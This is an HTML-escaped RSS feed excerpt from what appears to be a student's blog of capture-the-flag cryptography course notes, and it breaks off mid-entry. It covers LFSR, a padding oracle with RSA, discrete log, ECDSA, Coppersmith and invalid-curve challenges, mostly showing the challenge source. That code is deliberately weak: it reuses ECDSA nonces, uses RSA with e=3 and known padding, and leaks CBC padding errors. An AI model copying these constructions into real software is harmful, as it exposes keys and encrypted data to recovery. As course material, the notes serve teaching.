&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(pt &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x06(2023 HW - LFSR)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x062023-hw---lfsr/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x062023-hw---lfsr/</guid><description>&lt;h1 id="simple-crypto---0x062023-hw---lfsr">
 Simple Crypto - 0x06(2023 HW - LFSR)
 &lt;a class="anchor" href="#simple-crypto---0x062023-hw---lfsr">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://www.geeksforgeeks.org/python-list-xor/">Python – List XOR&lt;/a>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> funtools &lt;span style="color:#f92672">import&lt;/span> reduce
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>test_list &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">9&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>res &lt;span style="color:#f92672">=&lt;/span> reduce(&lt;span style="color:#66d9ef">lambda&lt;/span> x, y: x &lt;span style="color:#f92672">^&lt;/span> y, test_list) &lt;span style="color:#75715e"># The output is 2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;a href="https://www.qiniu.com/qfans/qnso-67006518#comments">Numpy矩陣乘法，但不是乘法，而是XOR的元素&lt;/a>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> numpy &lt;span style="color:#66d9ef">as&lt;/span> np
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m1 &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>array([[&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>], [&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>], [&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>]])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m2 &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>array([[&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>], [&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>], [&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>]])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mr &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>empty((m2&lt;span style="color:#f92672">.&lt;/span>shape[&lt;span style="color:#ae81ff">0&lt;/span>], m1&lt;span style="color:#f92672">.&lt;/span>shape[&lt;span style="color:#ae81ff">1&lt;/span>]), dtype &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>int64)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(mr&lt;span style="color:#f92672">.&lt;/span>shape[&lt;span style="color:#ae81ff">0&lt;/span>]):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> j &lt;span style="color:#f92672">in&lt;/span> range(mr&lt;span style="color:#f92672">.&lt;/span>shape[&lt;span style="color:#ae81ff">1&lt;/span>]):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mr[i, j] &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>sum(m1[:, j] &lt;span style="color:#f92672">^&lt;/span> m2[i, :])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(mr)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;a href="https://pyradise.com/%e4%bd%bf%e7%94%a8-python-%e4%be%86%e8%aa%8d%e8%ad%98%e7%9f%a9%e9%99%a3-915376207187">使用 Python 來認識矩陣&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ithelp.ithome.com.tw/articles/10203624">[Day07]Learning Numpy - 建立、合併、分割 - CheetSheet for Numpy&lt;/a>&lt;/li>
&lt;li>Sage
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install sagemath -y &lt;span style="color:#75715e"># wsl/unix base可以直接安裝，如果是windows要下載sage binary，有1.4GB&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sage -n &lt;span style="color:#75715e"># 開起sage notebook，也就是可以用sage kernel運行jupyter&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sage &amp;lt;.py/.sage file&amp;gt; &lt;span style="color:#75715e"># 用sage運行腳本&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sage &lt;span style="color:#75715e"># 直接開啟sage interactive shell&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題和前面的triLFSR不一樣的地方在於他只有一層的LFSR，但他只會每個70個才會給一個state，換句話說我們只能拿到$S_{71&lt;em>0+70},\ S_{71&lt;/em>1+70},\ S_{71&lt;em>2+70},\ S_{71&lt;/em>3+70}&amp;hellip;$(從0開始算)，而前面256個拿到的State最後會和flag進行XOR，只有最後70個是最純粹的State&lt;/p></description></item><item><title>Simple Crypto - 0x07(2023 HW - Oracle)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x072023-hw---oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x072023-hw---oracle/</guid><description>&lt;h1 id="simple-crypto---0x072023-hw---oracle">
 Simple Crypto - 0x07(2023 HW - Oracle)
 &lt;a class="anchor" href="#simple-crypto---0x072023-hw---oracle">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>POA/RSA&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Oracle.py&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from Crypto.Util.number import bytes_to_long
from Crypto.Cipher import AES
from random import randbytes
from secret import aes_key, p, q

def pad(m):
 length = 16-len(m) % 16
 return m + chr(length).encode()*length

def unpad(c):
 length = c[-1]
 for char in c[-length:]:
 if char != length:
 raise ValueError
 return c[:-length]

def asymmetric_encryption(message, N, e):
 # encrypt message with RSA
 # message must be 16 bytes
 # padding 100 bytes random value
 padded_message = randbytes(100) + message
 return pow(bytes_to_long(padded_message), e, N)

def symmetric_encryption(message, key):
 # ecrypt message with AES + CBC Mode
 # message can be arbitrary length
 cipher = AES.new(key, AES.MODE_CBC)
 ct = cipher.encrypt(pad(message))
 iv = cipher.iv
 return iv, ct

## Alice: This is my public key.
# p = getPrime(512)
# q = getPrime(512)
N = p * q
e = 65537
print( f&amp;#34;{N = }, {e = }&amp;#34; )
# N = 69214008498642035761243756357619851816607540327248468473247478342523127723748756926949706235406640562827724567100157104972969498385528097714986614165867074449238186426536742677816881849038677123630836686152379963670139334109846133566156815333584764063197379180877984670843831985941733688575703811651087495223
# e = 65537

## Bob: I want to send message to Alice! But my message is too looooooong......
flag = open(&amp;#34;flag.png&amp;#34;, &amp;#34;rb&amp;#34;).read()

## Bob: Oh! I can use symmetric encryption.
iv, ct = symmetric_encryption(flag, aes_key)
encrypted_key = asymmetric_encryption(aes_key, N, e)
encrypted_iv = asymmetric_encryption(iv, N, e)
print( f&amp;#34;{encrypted_key = }&amp;#34; )
print( f&amp;#34;{encrypted_iv = }&amp;#34; )
open(&amp;#34;encrypted_flag.not_png&amp;#34;, &amp;#34;wb&amp;#34;).write(ct)

## Bob: Ha ha! Now no one can decrypt my message except Alice!
# encrypted_key = 65690013242775728459842109842683020587149462096059598501313133592635945234121561534622365974927219223034823754673718159579772056712404749324225325531206903216411508240699572153162745754564955215041783396329242482406426376133687186983187563217156659178000486342335478915053049498619169740534463504372971359692
# encrypted_iv = 35154524936059729204581782839781987236407179504895959653768093617367549802652967862418906182387861924584809825831862791349195432705129622783580000716829283234184762744224095175044663151370869751957952842383581513986293064879608592662677541628813345923397286253057417592725291925603753086190402107943880261658
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler Alice.py&lt;/p></description></item><item><title>Simple Crypto - 0x08(2023 Lab - dlog)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x082023-lab---dlog/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x082023-lab---dlog/</guid><description>&lt;h1 id="simple-crypto---0x082023-lab---dlog">
 Simple Crypto - 0x08(2023 Lab - dlog)
 &lt;a class="anchor" href="#simple-crypto---0x082023-lab---dlog">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/u4ZVc8PuJC0?si=2wbiGreg_BZQ-dff"> [edu-ctf 2023] week03 - crypto2 &lt;/a>
&lt;a href="https://hackmd.io/@SBK6401/SJobiaxQ3#5-Little-Knowledge-Proof">Cryptography and Network Security – Homework 2 - Little Knowledge Proof&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> isPrime, bytes_to_long
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> int(input(&lt;span style="color:#e6db74">&amp;#34;give me a prime: &amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>strip())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> isPrime(p):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Do you know what is primes?&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> p&lt;span style="color:#f92672">.&lt;/span>bit_length() &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">1024&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Bit length need to be 1024&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g &lt;span style="color:#f92672">=&lt;/span> int(input(&lt;span style="color:#e6db74">&amp;#34;give me a number: &amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>strip())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(FLAG)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;The hint about my secret:&amp;#39;&lt;/span>, pow(g, flag, p))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x09(2023 Lab - signature)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x092023-lab---signature/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x092023-lab---signature/</guid><description>&lt;h1 id="simple-crypto---0x092023-lab---signature">
 Simple Crypto - 0x09(2023 Lab - signature)
 &lt;a class="anchor" href="#simple-crypto---0x092023-lab---signature">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/u4ZVc8PuJC0?si=ychlqdZnGVfFYRAV&amp;amp;t=4075"> [edu-ctf 2023] week03 - crypto2 - ECDSA&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>&lt;img src="https://hackmd.io/_uploads/ryVbmdMWp.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/HkJMXOG-T.png" alt="" />&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from random import randint
from Crypto.Util.number import *
from hashlib import sha256
from ecdsa import SECP256k1
from ecdsa.ecdsa import Public_key, Private_key, Signature
from secret import FLAG

E = SECP256k1
G, n = E.generator, E.order

d = randint(1, n)
k = randint(1, n)
pubkey = Public_key(G, d*G)
prikey = Private_key(pubkey, d)
print(f&amp;#39;P = ({pubkey.point.x()}, {pubkey.point.y()})&amp;#39;)

for _ in range(3):
 print(&amp;#39;&amp;#39;&amp;#39;
1) Request for Signature
2) Check the Permission
3) exit&amp;#39;&amp;#39;&amp;#39;)
 option = input()
 if option == &amp;#39;1&amp;#39;:
 msg = input(&amp;#39;What do you want? &amp;#39;)
 if msg == &amp;#39;Give me the FLAG.&amp;#39;:
 print(&amp;#39;No way!&amp;#39;)
 else:
 h = sha256(msg.encode()).digest()
 # k = k * 1337 % n
 sig = prikey.sign(bytes_to_long(h), k)
 print(f&amp;#39;sig = ({sig.r}, {sig.s})&amp;#39;)

 elif option == &amp;#39;2&amp;#39;:
 msg = &amp;#39;Give me the FLAG.&amp;#39;
 r = input(&amp;#39;r: &amp;#39;)
 s = input(&amp;#39;s: &amp;#39;)
 h = bytes_to_long(sha256(msg.encode()).digest())
 verified = pubkey.verifies(h, Signature(int(r), int(s)))
 if verified:
 print(FLAG)
 else:
 print(&amp;#39;Bad signature&amp;#39;)
 else:
 print(&amp;#34;bye~&amp;#34;)
 break
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x10(2023 Lab - coppersmith)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x102023-lab---coppersmith/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x102023-lab---coppersmith/</guid><description>&lt;h1 id="simple-crypto---0x102023-lab---coppersmith">
 Simple Crypto - 0x10(2023 Lab - coppersmith)
 &lt;a class="anchor" href="#simple-crypto---0x102023-lab---coppersmith">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/">coppersmith相關攻擊&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from Crypto.Util.number import bytes_to_long, getPrime
from secret import FLAG

assert len(FLAG) &amp;lt;= 30

p = getPrime(1024)
q = getPrime(1024)
n = p * q
e = 3
padding = b&amp;#34;Padding in cryptography is a fundamental concept employed to ensure that data, typically in the form of plaintext, aligns properly with the encryption algorithm&amp;#39;s block size. This process is crucial for symmetric block ciphers like AES and asymmetric encryption algorithms such as RSA. Padding involves adding extra bits to the input data before encryption, making it fit neatly into fixed-size blocks. The primary purpose of padding is to prevent information leakage by ensuring that the last block of plaintext is always complete, even when the original data&amp;#39;s size isn&amp;#39;t a perfect multiple of the block size. Common padding schemes include PKCS#7, PKCS#1 (for RSA), and ANSI X.923, each with its rules for padding and unpadding data. Proper padding ensures data integrity, security, and compatibility within cryptographic protocols.&amp;#34;
pt = padding + FLAG
ct = pow(bytes_to_long(pt), e, n)
print(f&amp;#34;{e = }&amp;#34;)
print(f&amp;#34;{n = }&amp;#34;)
print(f&amp;#34;{ct = }&amp;#34;)
# e = 3
# n = 11548249006448728920152703839381630946834097081458641312395741399152626808167055308830597218237419306363812953570976143239712039037941209800604194908083149885941768218371746741812573578768412807189143962911312361667909189521442378332430658999991458388376075547304981934158525694587528155624390264161508298680598416212224037418377397597560818727159266535257243347737195812548494888452510974912762585150695881388036715559552242157015756455473208463066542053661043988897316002396230791287157322382659981842882278113445574922266102197380093864871418103716702341116793118630092030597784102701252267617442078055768183287429
# ct = 10016669153906644953016660527326048255337800602435656916304698358749910229624738375584073093905785564737742726549033330343901680652357648652891913260149958947299067801907769873568759955053120633017158582128001396334187309835478967775943564724073809481988489791896725867047366927584419210464759674986336704398037888892734158765679221980466827060998749130113847401820986980535379266905587107992796676977541915779320084736207068268591500847603252838325486939367980604888710370629644796971859833251926677637185722683564847418746350226830775205063128441515048529918173084258483536354002888691012853231754416802134513394608
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto 0x11(2023 HW - invalid_curve_attack)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x112023-hw---invalid_curve_attack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x112023-hw---invalid_curve_attack/</guid><description>&lt;h1 id="simple-crypto-0x112023-hw---invalid_curve_attack">
 Simple Crypto 0x11(2023 HW - invalid_curve_attack)
 &lt;a class="anchor" href="#simple-crypto-0x112023-hw---invalid_curve_attack">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/maple3142/My-CTF-Challenges/blob/7d9141ac7b61fdbb71f29c07d489018d7c0a0aaa/AIS3%20Pre-exam%202022/pekobot/README.md">pekobot - maple&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>這邊我會嘗試用簡單的講法把這個攻擊簡述一遍，詳細還是建議 &lt;a href="https://github.com/ashutosh1206/Crypton/blob/master/Diffie-Hellman-Key-Exchange/Attack-Invalid-Curve-Point/README.md">Crypton&lt;/a> 或是其他地方的說明。&lt;/p>
&lt;p>Invalid Curve Attack 大致上來說利用的是當一個不在原本曲線 $E$ 上的 $P$ 進行 scalar multiplication 的一些特性，使用類似 &lt;a href="https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm">Pohlig–Hellman algorithm&lt;/a> 的辦法在不同的 subgroup 解 &lt;a href="https://en.wikipedia.org/wiki/Discrete_logarithm">DLP&lt;/a> 然後用 &lt;a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem">CRT&lt;/a> 解回原本的 private key。&lt;/p>
&lt;p>一個 Short Weierstrass curve 長這樣:&lt;/p>
&lt;p>$$
y^2 = x^3 + ax + b
$$&lt;/p>
&lt;p>而它的 point doubling formula ($R=2P$) 是:&lt;/p>
&lt;p>$$
\begin{aligned}
s &amp;amp;= \frac{3x_P^2+a}{2y_P} \
x_R &amp;amp;= s^2 - 2x_P \
y_R &amp;amp;= y_P + s(x_R - x_P)
\end{aligned}
$$&lt;/p></description></item><item><title>Simple Crypto 0x12(2023 HW - signature_revenge)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x122023-hw---signature_revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x122023-hw---signature_revenge/</guid><description>&lt;h1 id="simple-crypto-0x122023-hw---signature_revenge">
 Simple Crypto 0x12(2023 HW - signature_revenge)
 &lt;a class="anchor" href="#simple-crypto-0x122023-hw---signature_revenge">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://hackmd.io/_uploads/Skf4o1tGp.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/B16No1FzT.png" alt="" />&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> hashlib &lt;span style="color:#f92672">import&lt;/span> sha256, md5
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> ecdsa &lt;span style="color:#f92672">import&lt;/span> SECP256k1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> ecdsa.ecdsa &lt;span style="color:#f92672">import&lt;/span> Public_key, Private_key
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>E &lt;span style="color:#f92672">=&lt;/span> SECP256k1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>G, n &lt;span style="color:#f92672">=&lt;/span> E&lt;span style="color:#f92672">.&lt;/span>generator, E&lt;span style="color:#f92672">.&lt;/span>order
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>d &lt;span style="color:#f92672">=&lt;/span> bytes_to_long( os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(FLAG)) &lt;span style="color:#f92672">+&lt;/span> FLAG )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pubkey &lt;span style="color:#f92672">=&lt;/span> Public_key(G, d&lt;span style="color:#f92672">*&lt;/span>G)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>prikey &lt;span style="color:#f92672">=&lt;/span> Private_key(pubkey, d)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>magic1 &lt;span style="color:#f92672">=&lt;/span> md5(d&lt;span style="color:#f92672">.&lt;/span>to_bytes(&lt;span style="color:#ae81ff">32&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;big&amp;#34;&lt;/span>))&lt;span style="color:#f92672">.&lt;/span>digest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>magic2 &lt;span style="color:#f92672">=&lt;/span> md5(d&lt;span style="color:#f92672">.&lt;/span>to_bytes(&lt;span style="color:#ae81ff">32&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;big&amp;#34;&lt;/span>)[::&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>])&lt;span style="color:#f92672">.&lt;/span>digest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>h1 &lt;span style="color:#f92672">=&lt;/span> sha256(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;https://www.youtube.com/watch?v=IBnrn2pnPG8&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>digest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>h2 &lt;span style="color:#f92672">=&lt;/span> sha256(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;https://www.youtube.com/watch?v=1H2cyhWYXrE&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>digest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>k1 &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(magic1 &lt;span style="color:#f92672">+&lt;/span> magic2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>k2 &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(magic2 &lt;span style="color:#f92672">+&lt;/span> magic1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sig1 &lt;span style="color:#f92672">=&lt;/span> prikey&lt;span style="color:#f92672">.&lt;/span>sign(bytes_to_long(h1), k1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sig2 &lt;span style="color:#f92672">=&lt;/span> prikey&lt;span style="color:#f92672">.&lt;/span>sign(bytes_to_long(h2), k2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;P = (&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>pubkey&lt;span style="color:#f92672">.&lt;/span>point&lt;span style="color:#f92672">.&lt;/span>x()&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>pubkey&lt;span style="color:#f92672">.&lt;/span>point&lt;span style="color:#f92672">.&lt;/span>y()&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">)&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;sig1 = (&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>sig1&lt;span style="color:#f92672">.&lt;/span>r&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>sig1&lt;span style="color:#f92672">.&lt;/span>s&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">)&amp;#39;&lt;/span>)
